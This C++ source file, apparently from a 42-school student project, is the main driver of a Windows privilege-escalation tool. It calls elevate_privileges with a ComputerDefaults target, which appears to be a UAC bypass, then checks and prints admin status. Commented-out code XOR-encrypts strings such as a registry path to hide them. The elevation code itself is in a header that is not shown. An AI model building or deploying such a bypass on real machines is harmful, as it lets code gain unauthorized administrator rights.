/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   basic.cpp                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/08/24 02:17:40 by zcadinot          #+#    #+#             */
/*   Updated: 2026/08/24 03:33:35 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "privesc.hpp"

int	main(void)
{
	//std::cout << key_xor(std::string(FHELPER,sizeof(FHELPER) - 1), XOR_KEY) << std::endl;
	// std::string	encrypted;
	// std::string	decrypted;

	// encrypted = key_xor(std::string(path_reg, sizeof(path_reg) - 1), XOR_KEY);
	// print_encrypted(encrypted);

	int	admin;

	elevate_privileges(COMPUTERDEFAULTS);
	admin = is_admin();
	if (!admin)
		printf("Admin: False\n");
	else
		printf("Admin: True\n");
	while (1)
		Sleep(1000);
	return (0);
}
